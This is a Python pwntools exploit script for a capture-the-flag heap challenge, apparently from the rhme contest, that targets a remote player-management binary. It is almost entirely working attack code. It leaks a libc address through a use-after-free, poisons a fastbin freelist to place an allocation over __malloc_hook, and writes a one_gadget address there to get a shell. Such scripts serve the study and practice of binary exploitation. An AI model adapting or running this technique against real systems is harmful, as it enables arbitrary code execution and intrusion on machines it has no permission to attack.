#!/bin/env python2

from pwn import *
from pwnlib import gdb

from binascii import hexlify

context(arch = 'amd64', os = 'linux', terminal = ['termite','-e'])
#context.log_level = 'debug'

REMOTE = True

if REMOTE:
    LOCAL_BINARY = 'main.elf'
    LIBC = './libc.so.6'
else:
    LOCAL_BINARY = 'main.elf'
    #LOCAL_BINARY = 'nodaemon.elf'
    #LOCAL_BINARY = 'noserve.elf'
    #LOCAL_BINARY = 'reimplementation'
    LIBC ='/usr/lib/libc.so.6'
    #LIBC = './libc.so.6'

elf = ELF(LOCAL_BINARY)
libc = ELF(LIBC)

rop = ROP(elf)

#exit()

if REMOTE:
    r = remote('pwn.rhme.riscure.com', 1337)
else:
    r = process(LOCAL_BINARY)
    #r = remote('localhost', 1337)

    gdb.attach(LOCAL_BINARY, '''
    set follow-fork-mode child
    source gdb_dump_players.py
    ''')

def add_player(name, attack_points='0', defense_points='0', speed='0',
               precision='0'):
    r.sendline('1')  # Add player
    r.sendline(name) # Name
    r.sendline(attack_points)  # Attack points
    r.sendline(defense_points) # Defense points
    r.sendline(speed)          # Speed
    r.sendline(precision)      # Precision
    r.recvuntil('Your choice: ')

def select_player(slot):
    r.sendline('3') # Select player
    r.sendline(slot)
    r.recvuntil('Your choice: ')

def remove_player(slot):
    r.sendline('2') # Remove player
    r.sendline(slot)
    r.recvuntil('Your choice: ')

def edit_name(new_name):
    r.sendline('4') # Edit player
    r.recvuntil('Your choice: ')
    r.sendline('1') # Edit name
    r.recvuntil('Enter new name: ')
    r.sendline(new_name)
    r.sendline('0') # Go back
    r.recvuntil('Your choice: ')

def set_attack_points(new_attack_points):
    r.sendline('4') # Edit player
    r.recvuntil('Your choice: ')
    r.sendline('2') # Set attack points
    r.recvuntil('Enter attack points: ')
    r.sendline(new_attack_points)
    r.sendline('0') # Go back
    r.recvuntil('Your choice: ')

def get_name():
    r.sendline('5') # Show player
    r.recvuntil('Name: ')
    #name = r.recvuntil('\n')[:-1]
    name = r.recvuntil('A/D/S/P: ')[:-9]
    r.recvuntil('Your choice: ')
    return name

def get_attack_points():
    r.sendline('5') # Show player
    r.recvuntil('A/D/S/P: ')
    attack_points = r.recvuntil(',')[:-1]
    r.recvuntil('Your choice: ')
    return attack_points

def get_defense_points():
    r.sendline('5') # Show player
    r.recvuntil('A/D/S/P: ')
    r.recvuntil(',')
    defense_points = r.recvuntil(',')[:-1]
    r.recvuntil('Your choice: ')
    return defense_points

# Since we gobble up the menu...
def print_menu():
    print("0.- Exit")
    print("1.- Add player")
    print("2.- Remove player")
    print("3.- Select player")
    print("4.- Edit player")
    print("5.- Show player")
    print("6.- Show team")
    print("Your choice: ")

def leak_main_arena_addr():
    add_player('a'*0xfe, '1', '1', '1', '1') # Slot 0
    add_player('a'*0xfe, '1', '1', '1', '1') # Slot 1
    select_player('')
    remove_player('')
    main_arena_bytes = get_name()
    main_arena_addr = int(hexlify(main_arena_bytes[5::-1]), 16)
    remove_player('1')
    return main_arena_addr

def leak_selected_name_addr():
    # Assuming player_t has been freed
    # Get the address of the selected name string (the next free chunk)
    # Both chunks have to be in the same bin (fastbin)
    name_addr = int(get_attack_points())
    return name_addr

def leak_heap_addr():
    add_player('a'*0x20, '1', '1', '1', '1')
    select_player('')
    remove_player('')
    # Attack points will now return the pointer to the next free chunk, 
    # which is the name string - located at heap+0x20
    # NOTE: THIS MUST BE THE FIRST ALLOCATION DONE - otherwise the offset will
    #       not be correct.
    #       We could probably just mask out the last few bytes and get the
    #       same result though...
    heap_addr = int(get_attack_points()) - 0x20
    return heap_addr

r.recvuntil('Your choice: ')

print('Leaking main arena address...')
main_arena_addr = leak_main_arena_addr()

print("This is an (offset) address in the main arena: {:#x}".format(main_arena_addr))

# The main arena address is offset from the base
main_arena_offset = 88
main_arena_addr = main_arena_addr - main_arena_offset
print("This is the main arena: {:#x}".format(main_arena_addr))

malloc_hook_addr = main_arena_addr - 0x10
print("__malloc_hook address: {:#x}".format(malloc_hook_addr))

libc_base_addr = malloc_hook_addr - libc.symbols['__malloc_hook']
print("libc base address: {:#x}".format(libc_base_addr))

# Set address so that we get automatic correction when retrieving symbols etc.
libc.address = libc_base_addr

# Try to overwrite malloc_hook again...
add_player('b'*0x60, '1', '1', '1', '1') # Slot 0
add_player('b'*0x60, '1', '1', '1', '1') # Slot 1
add_player('b'*0x60, '1', '1', '1', '1') # Slot 2

select_player('1')
remove_player('')  # Places 1 in freelist
remove_player('1')   # Places 0 in freelist, sets fd in 1

fd = malloc_hook_addr - 0x20 + 0xd
print('fd = {:#x}'.format(fd))

edit_name('b'*0x60)

# Zero out the MSB (writing 7 bytes terminates the string at byte 8)
edit_name('a'*7)

edit_name(p64(fd))

add_player('b'*0x60, '1', '1', '1', '1') # Slot 3

# This will allocate memory for the name string on top of __malloc_hook,
# and corrupting the first part of main_arena in the process. Because of this,
# we want to avoid allocating any more memory until the hook has been correctly
# set.
add_player('b'*0x60, '1', '1', '1', '1') # Slot 4

# Target found with one_gadget
target = libc_base_addr + 0xf0274

target_str = p64(target)

print('Target: {:#x}'.format(target))
print('Target: {}'.format(hexlify(p64(target))))

select_player('1')

padding = 'd'*3
edit_name(padding + 'c'*7)
edit_name(padding + target_str[0:7])

print_menu()
r.interactive()
# Now go ahead and add a new player (triggering malloc_hook)